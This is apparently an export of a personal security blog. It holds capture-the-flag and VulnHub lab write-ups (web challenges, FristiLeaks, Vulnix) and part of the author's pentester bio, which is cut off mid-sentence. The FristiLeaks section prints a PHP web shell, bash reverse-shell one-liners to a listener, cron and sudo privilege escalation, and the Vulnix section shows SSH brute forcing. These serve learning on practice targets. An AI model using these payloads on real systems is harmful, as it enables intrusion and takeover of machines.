[{"content":"Challenge 1. We are given this challenge\nUsing curl we can see the that we need to make a POST request together with the username and password parameter\n❯ curl http://165.227.106.113/post.php \u0026lt;h1\u0026gt;This site takes POST data that you have not submitted!\u0026lt;/h1\u0026gt;\u0026lt;!-- username: admin | password: 71urlkufpsdnlkadsf --\u0026gt; We can then use curl again this time specifying the -X flag for POST request and -d for data\n❯ curl http://165.227.106.113/post.php -X POST -d username=admin -d password=71urlkufpsdnlkadsf \u0026lt;h1\u0026gt;flag{p0st_d4t4_4ll_d4y}\u0026lt;/h1\u0026gt; Challenge 2. We are given the following challenge\nFirst of all we make a request with curl and we can see that we have a user agent problem specifying the user agent to be used in comment, Sup3rS3cr3tAg3nt.\n❯ curl http://165.227.106.113/header.php Sorry, it seems as if your user agent is not correct, in order to access this website. The one you supplied is: curl/8.6.0 \u0026lt;!-- Sup3rS3cr3tAg3nt --\u0026gt; Using the specified user agent with the -A flag we have another error saying we need to come form awesomesauce.com\n❯ curl http://165.227.106.113/header.php -A Sup3rS3cr3tAg3nt Sorry, it seems as if you did not just come from the site, \u0026#34;awesomesauce.com\u0026#34;. \u0026lt;!-- Sup3rS3cr3tAg3nt --\u0026gt; We can specify the awesomesauce.com website by using the --referer option.\n❯ curl http://165.227.106.113/header.php -A Sup3rS3cr3tAg3nt --referer awesomesauce.com Here is your flag: flag{did_this_m3ss_with_y0ur_h34d} \u0026lt;!-- Sup3rS3cr3tAg3nt --\u0026gt; Challenge 3. We are given the following challenge\nViewing source code i couldn\u0026rsquo;t find any password. However there is something wrong about the URL as navigating to /where-am-i redirects me to /where-am-i?getoutofhere. Decided to use burp to analyze this and found the password. We submitted the password and we have this page\nChallenge 4. We are given the following challenge :\nWe just need a little bit of research skills here, which led me to this.\nAs requested we can go ahead and submit flag format as ; picoCTF{CVE-2021-34527}.\nChallenge 5. We are given the following challenge\nNavigating to the website we have an upload function saying we should upload 2 files.\nI started by uploading 2 PDF files which are the same, as the website only accepts PDF file types. This gave me an error saying we must upload 2 different PDF files.\n\u0026hellip;.Then i get another error saying \u0026ldquo;MD5 hashes do not match\u0026rdquo;, This made me understand that different files are judged by one MD5 hash, weird!!\nStarted to look up google and ended up with the search term \u0026ldquo;What is a MD5 collision attack?\u0026rdquo;\nThis led me to this GitHub respository with 2 files each which has the same MD5. we can download the following files as shown in the below screenshot.\nUploading this 2 files we got the following flag and bypassed the filter in place.\nChallenge 6. We are given the following challenge :\nI made a curl request to the default web page as usual and got the following page, in summary asking \u0026ldquo;where are the robots?\u0026rdquo;.\n❯ curl http://jupiter.challenges.picoctf.org:60915/ \u0026lt;!doctype html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Welcome\u0026lt;/title\u0026gt; \u0026lt;link href=\u0026#34;https://fonts.googleapis.com/css?family=Monoton|Roboto\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;style.css\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;header\u0026gt; \u0026lt;h1\u0026gt;Welcome\u0026lt;/h1\u0026gt; \u0026lt;/header\u0026gt; \u0026lt;div class=\u0026#34;content\u0026#34;\u0026gt; \u0026lt;p\u0026gt;Where are the robots?\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;footer\u0026gt;\u0026lt;/footer\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Since by default robots are stored at /robots.txt which tells search engine crawlers which URLs the crawler can access on your site. We can go ahead and make a curl request to the endpoint.\n❯ curl http://jupiter.challenges.picoctf.org:60915/robots.txt User-agent: * Disallow: /8028f.html This shows that there is a /8028f.html endpoint in which we can go ahead and make another curl request to, giving us our flag.\n❯ curl http://jupiter.challenges.picoctf.org:60915/8028f.html \u0026lt;!doctype html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Where are the robots\u0026lt;/title\u0026gt; \u0026lt;link href=\u0026#34;https://fonts.googleapis.com/css?family=Monoton|Roboto\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;style.css\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;content\u0026#34;\u0026gt; \u0026lt;p\u0026gt;Guess you found the robots\u0026lt;br /\u0026gt; \u0026lt;flag\u0026gt;picoCTF{ca1cu1at1ng_Mach1n3s_8028f}\u0026lt;/flag\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;footer\u0026gt;\u0026lt;/footer\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Go ahead and submit the flag\nChallenge 7 - FristiLeaks: 1.3 About: Name: Fristileaks 1.3 Author: Ar0xA Series: Fristileaks Style: Enumeration/Follow the breadcrumbs Goal: get root (uid 0) and read the flag file Tester(s): dqi, barrebas Difficulty: Basic Description: A small VM made for a Dutch informal hacker meetup called Fristileaks. Meant to be broken in a few hours without requiring debuggers, reverse engineering, etc.. Instruction: VMware users will need to manually edit the VM\u0026#39;s MAC address to: 08:00:27:A5:A6:76 We start by running a network scan using the arp-scan utility.\n❯ sudo arp-scan -l Interface: wlan0, type: EN10MB, MAC: 1c:4d:70:2c:34:13, IPv4: 192.168.0.158 Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan) 192.168.0.1 98:a9:42:2c:e9:d3 Guangzhou Tozed Kangwei Intelligent Technology Co., LTD 192.168.0.134 1c:4d:70:2c:34:13 Intel Corporate 2 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.10.0: 256 hosts scanned in 2.068 seconds (123.79 hosts/sec). 2 responded Then running an nmap scan we have\n# Nmap 7.94SVN scan initiated Sun Aug 25 11:13:17 2024 as: nmap -p- -T4 -v --min-rate=1000 -sCV -oN nmap.txt 192.168.0.134 Nmap scan report for 192.168.0.134 Host is up (0.00046s latency). Not shown: 65409 filtered tcp ports (no-response), 125 filtered tcp ports (host-unreach) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3) |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=UTF-8). | http-methods: | Supported Methods: GET HEAD POST OPTIONS TRACE |_ Potentially risky methods: TRACE |_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3 | http-robots.txt: 3 disallowed entries |_/cola /sisi /beer Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Aug 25 11:15:25 2024 -- 1 IP address (1 host up) scanned in 127.54 seconds Using curl to check for existence of /robots.txt we have\n❯ curl http://192.168.0.134/robots.txt User-agent: * Disallow: /cola Disallow: /sisi Disallow: /beer This 3 directories provides us with the same image which after analysis has nothing to show at all\nI also tried to fuzz through this discovered endpoints, but nothing also, then i decided to guess the directories trying /fristileaks first and /fristi which gave us this admin portal\nI tried admin default credentials including SQLi attacks but to no avail so i decided to view source code\nFound out that a user called eezeepz has stored junk base64 data in this source code Scrolling down i found the base64 encoded message and since as instructed it is an image we will try and do base642png for this scenario. Then browsed to this website and indeed we have a base64 decoded image, waiting for us.\nI thought that this was the password to the eezeepz user and as much as i thought, yes it is cos i was able to login with password keKkeKKeKKeKkEkkEk and got a upload page\nAfter several trial and error i was able to upload the below content with file name as rev.php.png\n\u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form method=\u0026#34;GET\u0026#34; name=\u0026#34;\u0026lt;?php echo basename($_SERVER[\u0026#39;PHP_SELF\u0026#39;]); ?\u0026gt;\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;TEXT\u0026#34; name=\u0026#34;cmd\u0026#34; id=\u0026#34;cmd\u0026#34; size=\u0026#34;80\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;SUBMIT\u0026#34; value=\u0026#34;Execute\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;pre\u0026gt; \u0026lt;?php if(isset($_GET[\u0026#39;cmd\u0026#39;])) { system($_GET[\u0026#39;cmd\u0026#39;]); } ?\u0026gt; \u0026lt;/pre\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;script\u0026gt;document.getElementById(\u0026#34;cmd\u0026#34;).focus();\u0026lt;/script\u0026gt; \u0026lt;/html\u0026gt; Then accessing the file on the /uploads directory we have a web shell, hehe\nYou can then attempt to gain a reverse shell with the below payload;\n# Start up listener nc -lvnp 4444 # Inject payload into the webshell for reverse shell /bin/bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.0.158/4444 0\u0026gt;\u0026amp;1 #################################################################### #################################################################### # Popped reverse shell ❯ nc -lvnp 4444 listening on [any] 4444 ... connect to [192.168.0.158] from (UNKNOWN) [192.168.0.134] 34811 bash: no job control in this shell bash-4.1$ whoami whoami apache bash-4.1$ Then i found a notes.txt file under /var/www which says this\nbash-4.1$ cat /var/www/notes.txt hey eezeepz your homedir is a mess, go clean it up, just dont delete the important stuff. -jerry Checking the user eezeepz i also found another notes.txt file\nbash-4.1$ cat notes.txt Yo EZ, I made it possible for you to do some automated checks, but I did only allow you access to /usr/bin/* system binaries. I did however copy a few extra often needed commands to my homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those from /home/admin/ Don\u0026#39;t forget to specify the full path for each binary! Just put a file called \u0026#34;runthis\u0026#34; in /tmp/, each line one command. The output goes to the file \u0026#34;cronresult\u0026#34; in /tmp/. It should run every minute with my account privileges. - Jerry bash-4.1$ pwd /home/eezeepz bash-4.1$ The above statement in summary says there is a cronjob running as an unknown user at /tmp with an editable file names runthis, that unknown user only has access to run binary files under the /home/admin/ directory respectively, this binaries have been specified.\nWe then need to pick from this binaries for example the chmod command to change modifications of the path probably /home/admin which we don\u0026rsquo;t have access to\nbash-4.1$ ls /home/admin ls: cannot open directory /home/admin: Permission denied bash-4.1$ nano /tmp/runthis bash-4.1$ cat /tmp/runthis #!/bin/bash /home/admin/chmod 777 /home/admin -R bash-4.1$ After 1 minute checking the permissions of the /home/admin directory we now have full RWX access\nbash-4.1$ ls -ld /home/admin drwxrwxrwx. 2 admin admin 4096 Nov 19 2015 /home/admin bash-4.1$ cd /home/admin bash-4.1$ pwd /home/admin bash-4.1$ ls cat cronjob.py cryptpass.py echo grep whoisyourgodnow.txt chmod cryptedpass.txt df egrep ps bash-4.1$ We can then attempt to gain a reverse shell as the unknown user by adding bash binary to /home/admin and then editing the /tmp/runthis file with our reverse shell payload, leaving us with a shell as admin as seen below.\nbash-4.1$ cp /bin/bash ./ bash-4.1$ chmod 777 bash bash-4.1$ nano /tmp/runthis bash-4.1$ cat /tmp/runthis #!/bin/bash /home/admin/chmod 777 /home/admin -R /home/admin/bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.0.158/1337 0\u0026gt;\u0026amp;1 bash-4.1$ #################################################################### #################################################################### # Wait for reverse shell ❯ nc -lvnp 1337 listening on [any] 1337 ... connect to [192.168.0.158] from (UNKNOWN) [192.168.0.134] 42273 bash: no job control in this shell [admin@localhost ~]$ whoami whoami admin Now the problem is even if you get a reverse shell, you still have some files that we need to figure out. like the cryptedpass.txt, cryptpass.txt and whoisyourgodnow.txt files.\nbash-4.1$ ls -la total 1548 drwxrwxrwx. 2 admin admin 4096 Aug 25 09:15 . drwxr-xr-x. 5 root root 4096 Nov 19 2015 .. -rwxrwxrwx 1 admin admin 129 Aug 25 09:25 .bash_history -rwxrwxrwx. 1 admin admin 18 Sep 22 2015 .bash_logout -rwxrwxrwx. 1 admin admin 176 Sep 22 2015 .bash_profile -rwxrwxrwx. 1 admin admin 124 Sep 22 2015 .bashrc -rwxrwxrwx 1 apache apache 906152 Aug 25 09:07 bash -rwxrwxrwx 1 admin admin 45224 Nov 18 2015 cat -rwxrwxrwx 1 admin admin 48712 Nov 18 2015 chmod -rwxrwxrwx 1 admin admin 737 Nov 18 2015 cronjob.py -rwxrwxrwx 1 admin admin 21 Nov 18 2015 cryptedpass.txt -rwxrwxrwx 1 admin admin 258 Nov 18 2015 cryptpass.py -rwxrwxrwx 1 admin admin 90544 Nov 18 2015 df -rwxrwxrwx 1 admin admin 24136 Nov 18 2015 echo -rwxrwxrwx 1 admin admin 163600 Nov 18 2015 egrep -rwxrwxrwx 1 admin admin 163600 Nov 18 2015 grep -rwxrwxrwx 1 admin admin 85304 Nov 18 2015 ps -rwxrwxrwx 1 admin admin 2354 Aug 25 09:15 typescript -rw-r--r-- 1 fristigod fristigod 25 Nov 19 2015 whoisyourgodnow.txt The script cryptpass.py is designed to take a string input, encode it with base64, reverse the string, apply ROT13, and then print the result.\n[admin@localhost ~]$ cat cryptedpass.txt mVGZ3O3omkJLmy2pcuTq [admin@localhost ~]$ cat cryptpass.py #Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn import base64,codecs,sys def encodeString(str): base64string= base64.b64encode(str) return codecs.encode(base64string[::-1], \u0026#39;rot13\u0026#39;) cryptoResult=encodeString(sys.argv[1]) print cryptoResult Reverse Engineering Steps: Reverse ROT13: Since ROT13 is symmetric, apply ROT13 again to decode it. Reverse the String: Reverse the ROT13-decoded string to get the original base64 string. Base64 Decode: Decode the reversed string from base64 to get the original plaintext. The below script did the work for me TBH, using chatgpt assistance\nimport base64, codecs def decodeString(encoded_str): # Step 1: Apply ROT13 again to decode rot13_decoded = codecs.encode(encoded_str, \u0026#39;rot13\u0026#39;) # Step 2: Reverse the string reversed_string = rot13_decoded[::-1] # Step 3: Decode from base64 original_string = base64.b64decode(reversed_string) return original_string # Example usage encoded_str = \u0026#34;mVGZ3O3omkJLmy2pcuTq\u0026#34; original_str = decodeString(encoded_str) print(original_str.decode(\u0026#39;utf-8\u0026#39;)) # Decode from bytes to string if needed Then tried the script for both files and we have clear text password for both user admin and fristigod\n#cryptpass.txt ❯ python3 exploit.py thisisalsopw123 #whoisyourgodnow.txt ❯ python3 exploit.py LetThereBeFristi! You can also do this with cyberchef, however i have crafted the recipe so just follow through this link\nThen switched user to fristigod since we don\u0026rsquo;t have access to this user\u0026rsquo;s home folder yet with the cracked password.\nbash-4.1$ su fristigod Password: bash-4.1$ whoami fristigod bash-4.1$ Checking sudo privileges we have permission to run a file called doCom at /var/fristigod/.secret_admin_stuff/ as user fristigod\nbash-4.1$ sudo -l Matching Defaults entries for fristigod on this host: requiretty, !visiblepw, always_set_home, env_reset, env_keep=\u0026#34;COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS\u0026#34;, env_keep+=\u0026#34;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE\u0026#34;, env_keep+=\u0026#34;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES\u0026#34;, env_keep+=\u0026#34;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE\u0026#34;, env_keep+=\u0026#34;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY\u0026#34;, secure_path=/sbin\\:/bin\\:/usr/sbin\\:/usr/bin User fristigod may run the following commands on this host: (fristi : ALL) /var/fristigod/.secret_admin_stuff/doCom bash-4.1$ However upon running this the right way i have the following error.\nbash-4.1$ sudo -u fristigod /var/fristigod/.secret_admin_stuff/doCom Sorry, user fristigod is not allowed to execute \u0026#39;/var/fristigod/.secret_admin_stuff/doCom\u0026#39; as fristigod on localhost.localdomain. Navigating to /var/fristigod i have a .bash_history file there\nbash-4.1$ pwd /var/fristigod bash-4.1$ ls -la total 16 drwxr-x--- 3 fristigod fristigod 4096 Nov 25 2015 . drwxr-xr-x. 19 root root 4096 Nov 19 2015 .. -rw------- 1 fristigod fristigod 900 Aug 25 09:42 .bash_history drwxrwxr-x. 2 fristigod fristigod 4096 Nov 25 2015 .secret_admin_stuff Reading this file i understood more how this command worked 🤣, we need to specify a command next to the actual command.\nbash-4.1$ cat .bash_history ls pwd ls -lah cd .secret_admin_stuff/ ls ./doCom ./doCom test sudo ls exit cd .secret_admin_stuff/ ls ./doCom sudo -u fristi ./doCom ls / sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls / exit --SNIP-- bash-4.1$ So i decided to run the whoami command and we got a response as user root\nbash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom whoami [sudo] password for fristigod: root bash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom ls /root -la total 48 dr-xr-x---. 3 root root 4096 Nov 25 2015 . dr-xr-xr-x. 22 root root 4096 Aug 25 08:51 .. -rw------- 1 root root 1936 Nov 25 2015 .bash_history -rw-r--r--. 1 root root 18 May 20 2009 .bash_logout -rw-r--r--. 1 root root 176 May 20 2009 .bash_profile -rw-r--r--. 1 root root 176 Sep 22 2004 .bashrc drwxr-xr-x. 3 root root 4096 Nov 25 2015 .c -rw-r--r--. 1 root root 100 Sep 22 2004 .cshrc -rw-------. 1 root root 1291 Nov 17 2015 .mysql_history -rw-r--r--. 1 root root 129 Dec 3 2004 .tcshrc -rw-------. 1 root root 829 Nov 17 2015 .viminfo -rw-------. 1 root root 246 Nov 17 2015 fristileaks_secrets.txt bash-4.1$ Spawning a shell as the root user would be as simple as doing this\nbash-4.1$ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom bash bash-4.1# whoami root bash-4.1# cd /root bash-4.1# ls fristileaks_secrets.txt bash-4.1# cat fristileaks_secrets.txt Congratulations on beating FristiLeaks 1.0 by Ar0xA [https://tldr.nu] I wonder if you beat it in the maximum 4 hours it\u0026#39;s supposed to take! Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode) Flag: Y0u_kn0w_y0u_l0ve_fr1st1 bash-4.1# Please Take note that when stabilizing shells python2 should be use.\nChallenge 8 - HackLAB: Vulnix Description: Here we have a vulnerable Linux host with configuration weaknesses rather than purposely vulnerable software versions (well at the time of release anyway!) The host is based upon Ubuntu Server 12.04 and is fully patched as of early September 2012. The details are as follows: - Architecture: x86 - Format: VMware (vmx \u0026amp; vmdk) compatibility with version 4 onwards - RAM: 512MB - Network: NAT - Extracted size: 820MB - Compressed (download size): 194MB – 7zip format – 7zip can be obtained from here - MD5 Hash of Vulnix.7z: 0bf19d11836f72d22f30bf52cd585757 The goal; boot up, find the IP, hack away and obtain the trophy hidden away in /root by any means you wish – excluding the actual hacking of the vmdk Free free to contact me with any questions/comments using the comments section below. Enjoy! Running the arp-scan utility we have the following result of our target host.\n❯ sudo arp-scan -l [sudo] password for sec-fortress: Interface: wlan0, type: EN10MB, MAC: 1c:4d:70:2c:34:13, IPv4: 192.168.0.158 Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan) 192.168.0.1 98:a9:42:2c:e9:d3 Guangzhou Tozed Kangwei Intelligent Technology Co., LTD 192.168.0.131 1c:4d:70:2c:34:13 Intel Corporate 3 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.10.0: 256 hosts scanned in 2.057 seconds (124.45 hosts/sec). 2 responded Running our nmap scan we have :\n# Nmap 7.94SVN scan initiated Sun Aug 25 14:18:08 2024 as: nmap -p- -T4 -v --min-rate=1000 -sCV -oN nmap.txt 192.168.0.131 Nmap scan report for vulnix (192.168.0.131) Host is up (0.0020s latency). Not shown: 65518 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 10:cd:9e:a0:e4:e0:30:24:3e:bd:67:5f:75:4a:33:bf (DSA) | 2048 bc:f9:24:07:2f:cb:76:80:0d:27:a6:48:52:0a:24:3a (RSA) |_ 256 4d:bb:4a:c1:18:e8:da:d1:82:6f:58:52:9c:ee:34:5f (ECDSA) 25/tcp open smtp Postfix smtpd | ssl-cert: Subject: commonName=vulnix | Issuer: commonName=vulnix | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha1WithRSAEncryption | Not valid before: 2012-09-02T17:40:12 | Not valid after: 2022-08-31T17:40:12 | MD5: 58e3:f1ac:fef6:b6d1:744c:836f:ba24:4f0a |_SHA-1: 712f:69ba:8c54:32e5:711c:898b:55ab:0a83:44a0:420b |_smtp-commands: vulnix, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN |_ssl-date: 2024-08-25T13:21:20+00:00; +3s from scanner time. 79/tcp open finger Linux fingerd |_finger: No one logged on.\\x0D 110/tcp open pop3? |_pop3-capabilities: PIPELINING CAPA TOP STLS SASL RESP-CODES UIDL | ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server | Issuer: commonName=vulnix/organizationName=Dovecot mail server | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha1WithRSAEncryption | Not valid before: 2012-09-02T17:40:22 | Not valid after: 2022-09-02T17:40:22 | MD5: 2b3f:3e28:c85d:e10c:7b7a:2435:c5e7:84fc |_SHA-1: 4a49:a407:01f1:37c8:81a3:4519:981b:1eee:6856:348e |_ssl-date: 2024-08-25T13:21:20+00:00; +3s from scanner time. 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100003 2,3,4 2049/tcp nfs | 100003 2,3,4 2049/tcp6 nfs | 100003 2,3,4 2049/udp nfs | 100003 2,3,4 2049/udp6 nfs | 100005 1,2,3 33717/udp mountd | 100005 1,2,3 44535/tcp6 mountd | 100005 1,2,3 50944/udp6 mountd | 100005 1,2,3 53510/tcp mountd | 100021 1,3,4 43297/udp6 nlockmgr | 100021 1,3,4 43584/udp nlockmgr | 100021 1,3,4 58082/tcp6 nlockmgr | 100021 1,3,4 58548/tcp nlockmgr | 100024 1 44406/tcp6 status | 100227 2,3 2049/tcp nfs_acl | 100227 2,3 2049/tcp6 nfs_acl | 100227 2,3 2049/udp nfs_acl |_ 100227 2,3 2049/udp6 nfs_acl 143/tcp open imap Dovecot imapd | ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server | Issuer: commonName=vulnix/organizationName=Dovecot mail server | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha1WithRSAEncryption | Not valid before: 2012-09-02T17:40:22 | Not valid after: 2022-09-02T17:40:22 | MD5: 2b3f:3e28:c85d:e10c:7b7a:2435:c5e7:84fc |_SHA-1: 4a49:a407:01f1:37c8:81a3:4519:981b:1eee:6856:348e |_imap-capabilities: more have STARTTLS ENABLE listed post-login capabilities IMAP4rev1 LITERAL+ LOGINDISABLEDA0001 LOGIN-REFERRALS OK Pre-login IDLE SASL-IR ID |_ssl-date: 2024-08-25T13:21:20+00:00; +3s from scanner time. 512/tcp open exec? 513/tcp open login 514/tcp open tcpwrapped 993/tcp open ssl/imap Dovecot imapd |_ssl-date: 2024-08-25T13:21:19+00:00; +2s from scanner time. |_imap-capabilities: more have ENABLE listed post-login capabilities IMAP4rev1 LITERAL+ ID SASL-IR OK Pre-login IDLE AUTH=PLAINA0001 LOGIN-REFERRALS | ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server | Issuer: commonName=vulnix/organizationName=Dovecot mail server | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha1WithRSAEncryption | Not valid before: 2012-09-02T17:40:22 | Not valid after: 2022-09-02T17:40:22 | MD5: 2b3f:3e28:c85d:e10c:7b7a:2435:c5e7:84fc |_SHA-1: 4a49:a407:01f1:37c8:81a3:4519:981b:1eee:6856:348e 995/tcp open ssl/pop3s? |_ssl-date: 2024-08-25T13:21:20+00:00; +3s from scanner time. |_pop3-capabilities: PIPELINING CAPA TOP USER SASL(PLAIN) RESP-CODES UIDL | ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server | Issuer: commonName=vulnix/organizationName=Dovecot mail server | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha1WithRSAEncryption | Not valid before: 2012-09-02T17:40:22 | Not valid after: 2022-09-02T17:40:22 | MD5: 2b3f:3e28:c85d:e10c:7b7a:2435:c5e7:84fc |_SHA-1: 4a49:a407:01f1:37c8:81a3:4519:981b:1eee:6856:348e 2049/tcp open nfs 2-4 (RPC #100003) 41889/tcp open status 1 (RPC #100024) 49007/tcp open mountd 1-3 (RPC #100005) 53510/tcp open mountd 1-3 (RPC #100005) 58548/tcp open nlockmgr 1-4 (RPC #100021) 59542/tcp open mountd 1-3 (RPC #100005) Service Info: Host: vulnix; OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: mean: 2s, deviation: 0s, median: 2s Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Aug 25 14:21:18 2024 -- 1 IP address (1 host up) scanned in 189.88 seconds Used the wordlist from here and the original tool from here ❯ python2 ssh_enum.py -u ../ssh-user-enumeration/wordlist.txt -i 192.168.0.131 Starting username enumeration ==================== User root took 17.0 seconds User root exists User admin took 1.0 seconds User user took 18.0 seconds User user exists User test took 2.0 seconds User guest took 2.0 seconds User ubuntu took 2.0 seconds User kali took 2.0 seconds User john took 2.0 seconds User jane took 2.0 seconds User smith took 2.0 seconds The following users were valid (settings were - multiplier of 20000 and a threshold of 14: =========================== root user We can then attempt to brute force SSH with the username we have at hand. which was successful.\n❯ hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://192.168.0.131 -v --SNIP-- [22][ssh] host: 192.168.0.131 login: user password: letmein [STATUS] attack finished for 192.168.0.131 (waiting for children to complete tests) [STATUS] 2049199.86 tries/min, 14344399 tries in 00:07h, 6 to do in 00:01h, 9 active 1 of 1 target successfully completed, 1 valid password found Got the password and logged in via SSH as the user in which password was cracked for.\n❯ ssh user@192.168.0.131 user@192.168.0.131\u0026#39;s password: Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686) * Documentation: https://help.ubuntu.com/ System information as of Sun Aug 25 21:57:25 BST 2024 System load: 0.06 Processes: 95 Usage of /: 90.2% of 773MB Users logged in: 0 Memory usage: 7% IP address for eth0: 192.168.0.131 Swap usage: 0% =\u0026gt; / is using 90.2% of 773MB Graph this data and manage this system at https://landscape.canonical.com/ user@vulnix:~$ whoami user There is a way to privilege escalate by abusing the \u0026ldquo;no_root_squash\u0026rdquo; privileges on NFS but i think the machine has a problem and that would be all for now.\nuser@vulnix:/tmp$ cat /etc/exports # /etc/exports: the access control list for filesystems which may be exported # to NFS clients. See exports(5). # # Example for NFSv2 and NFSv3: # /srv/homes hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check) # # Example for NFSv4: # /srv/nfs4 gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check) # /srv/nfs4/homes gss/krb5i(rw,sync,no_subtree_check) # /home/vulnix *(rw,root_squash) ","permalink":"http://localhost:1313/hacking/cfss/","summary":"Challenge 1. We are given this challenge\nUsing curl we can see the that we need to make a POST request together with the username and password parameter\n❯ curl http://165.227.106.113/post.php \u0026lt;h1\u0026gt;This site takes POST data that you have not submitted!\u0026lt;/h1\u0026gt;\u0026lt;!-- username: admin | password: 71urlkufpsdnlkadsf --\u0026gt; We can then use curl again this time specifying the -X flag for POST request and -d for data\n❯ curl http://165.227.106.113/post.php -X POST -d username=admin -d password=71urlkufpsdnlkadsf \u0026lt;h1\u0026gt;flag{p0st_d4t4_4ll_d4y}\u0026lt;/h1\u0026gt; Challenge 2.","title":"CFSS"},{"content":" ❓ Introduction Hii, I am a 19 yr/old security researcher/penetration tester with extensive networking, scripting, linux administration, active directory and a little cloud experience. Familiarity with security frameworks including OWASP Top 10, Microsoft SDL, MITRE ATT\u0026amp;CK Framework and SANS Top 25. Knowledgeable on defensive security concepts including SIEM and threat hunting. Actively pursuing the OSCP certification and cloud security to further validate proficiency and skill set.\n💻 Infosec, or about 80% of my life My love for Infosec started six years ago. With no mentor or anyone to guide me, I began my journey using TryHackMe.com, YouTube, and Stack Overflow to learn. Later on, I took the Security+ course from ITPro.TV, which allowed me to grasp the basics of cybersecurity, covering areas such as Threats, Attacks, and Vulnerabilities, Cryptography, Cloud and Virtualization, Operational Security, and Incident Response.\nWith this, I was able to continue my learning journey with various other platforms like HackTheBox, PortSwigger, HackMyVM, Vulnix, etc., which gave me a higher advantage in gaining practical experience. Most notably, playing Boot2Root CTFs provided me with an opportunity to join a CTF team called \u0026ldquo;5h4d0wbr0k3r5,\u0026rdquo; giving me a more solid understanding of penetration testing.\nI then landed my first role as a web application penetration tester at a company in India. From there, I secured another job in Nigeria as a network penetration tester, where I gained substantial experience in technical skills like Active Directory and Linux administration. Additionally, I developed soft skills in managing co-workers and working effectively as part of a team.\nI was fortunate to have all my penetration testing exams sponsored, for which I am truly grateful. I have also made a lot of trustworthy and 1337 friends like hac, obx, n16ht4wk, ramsey, rami, fr3y, nerdy, ezequiel and many others including someone who I am really looking upto, @hackingdave. I don\u0026rsquo;t know what the future holds, but continuous learning is key for me. I am eager to apply my skills and knowledge to real-world challenges in a dynamic company where I can contribute to and grow with the team.\n🏅 Courses and certifications This is a non-exhaustive list of certifications and courses I have taken.\nCertified Red Team Professional (badge here)\nCertified Penetration Testing Specialist (badge here)\nDante, Penetration Tester Level II lab (badge here)\nZephyr, Red Team Operator Level I lab (badge here)\nCurrently reading the book “Penetration Testing Azure for Ethical Hackers” by David Okeyode and Karl Fosaaen\nI’m also planning to take the 